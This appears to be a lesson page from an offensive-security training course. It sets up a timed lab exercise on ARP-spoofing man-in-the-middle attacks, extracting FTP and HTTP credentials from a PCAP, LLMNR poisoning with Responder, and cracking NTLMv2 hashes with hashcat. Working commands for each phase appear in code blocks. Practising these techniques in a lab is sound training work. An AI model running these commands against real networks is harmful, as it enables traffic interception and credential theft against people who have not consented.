---
title: "Infrastructure Practice Day 1 — MITM and Credential Capture Sprint"
tags: [practice, MITM, ARP-spoofing, credential-capture, Responder, bettercap,
       Wireshark, tshark, network, T1557, T1040, ATT&CK]
module: 04-BroadSurface-04
day: 245
related_topics:
  - MITM and ARP Spoofing (Day 231)
  - SMB Relay and LLMNR Poisoning (Day 232)
  - Network Credential Extraction (Day 233)
  - Infrastructure Practice Day 2 (Day 246)
---

# Day 245 — Infrastructure Practice Day 1: MITM and Credential Capture Sprint

> "Day one of practice is not a test — it is a temperature check. Find out
> which commands you remember and which you have to look up. Track how long
> each phase takes. The goal for today is a baseline. The goal for next week
> is half the time, no notes."
>
> — Ghost

---

## Goals

By the end of today's practice session you will have:

1. Executed a full ARP spoofing MITM attack on the lab network.
2. Captured and extracted credentials from at least two plaintext protocols.
3. Triggered an LLMNR query and captured the resulting NTLMv2 hash.
4. Attempted to crack the captured hash offline.
5. Documented your timing for each phase.

**Time budget:** 5–6 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| ARP spoofing theory and commands | Day 231 |
| LLMNR poisoning with Responder | Day 232 |
| PCAP credential extraction | Day 233 |

---

## Lab Setup

```bash
cd 04-BroadSurface-04/samples/mitm-lab/
docker compose up -d
# Network: 192.168.100.0/24
# victim-a: 192.168.100.10 (HTTP + FTP services)
# victim-b: 192.168.100.20 (Samba + SMB)
# gateway: 192.168.100.1
# attacker: 192.168.100.100

docker exec -it attacker bash
```

---

## Phase 1 — ARP Spoofing (Target: < 10 min)

```
[ ] IP forwarding enabled
[ ] ARP poison started against both victim-a and victim-b
[ ] Traffic capture running (tcpdump to PCAP)
[ ] Verified: victim-a ARP cache shows attacker MAC for victim-b
```

Time taken: ___ min

---

## Phase 2 — Credential Extraction from PCAP (Target: < 15 min)

```
[ ] FTP credentials extracted (victim-a runs FTP on port 21)
[ ] HTTP Basic Auth credentials extracted (victim-a /admin login)
[ ] HTTP POST form credentials extracted
[ ] At least 2 credential pairs documented
```

```bash
# Reference commands:
tshark -r /tmp/capture.pcap -Y "ftp.request.command == \"PASS\"" \
  -T fields -e ip.src -e ftp.request.arg

tshark -r /tmp/capture.pcap -Y "http.authorization" \
  -T fields -e ip.src -e http.authorization | \
  sed 's/Basic //' | base64 -d
```

Time taken: ___ min

---

## Phase 3 — LLMNR Poisoning and Hash Capture (Target: < 10 min)

```bash
# Start Responder (with SMB server on to capture hashes)
responder -I eth0 -v

# Trigger an LLMNR query from victim-b:
docker exec victim-b bash -c "smbclient //nonexistent-host/share 2>&1 || true"

# Wait for the hash to appear in Responder output
```

```
[ ] Responder started successfully
[ ] LLMNR query triggered
[ ] NTLMv2 hash captured and saved
[ ] Hash format verified (user::domain:challenge:hash:blob)
```

Time taken: ___ min

---

## Phase 4 — Hash Cracking (Target: < 10 min attempt)

```bash
# Attempt crack with rockyou.txt
hashcat -m 5600 /usr/share/responder/logs/*.txt \
  /usr/share/wordlists/rockyou.txt

# Record: did it crack? How long?
```

```
[ ] Hashcat command run
[ ] Result documented (cracked / not cracked)
[ ] If cracked: password recorded
[ ] If not: noted the hash for relay practice (Day 246)
```

Time taken: ___ min

---

## Phase 5 — PCAP Analysis Deep Dive (30 min)

Review your full capture from Phase 1:

```bash
# Protocol summary
tshark -r /tmp/capture.pcap -qz io,phs

# DNS queries during the session
tshark -r /tmp/capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e ip.src -e dns.qry.name | sort -u

# Unique IP conversations
tshark -r /tmp/capture.pcap -qz conv,ip
```

Answer these questions from the PCAP:
1. How many unique IP addresses appear in the capture?
2. What protocols carried the most traffic (by bytes)?
3. Are there any credentials you missed in the automated extraction?

---

## Session Record

| Phase | Target Time | Actual Time | Notes |
|---|---|---|---|
| ARP Spoofing setup | < 10 min | ___ | |
| Credential extraction | < 15 min | ___ | |
| LLMNR + hash capture | < 10 min | ___ | |
| Hash cracking attempt | < 10 min | ___ | |
| **Total** | < 45 min | ___ | |

**Which phase took the longest?** ___  
**What caused the delay?** ___  
**What will you do differently tomorrow?** ___

---

## Questions

> Add your questions here. Each question gets a Global ID (Q245.1, Q245.2 …).

---

## Navigation

← Previous: [Day 244 — Infrastructure Detection and Hardening](DAY-0244-Infrastructure-Detection-and-Hardening.md)
→ Next: [Day 246 — Infrastructure Practice Day 2](DAY-0246-Infrastructure-Practice-Day-2.md)
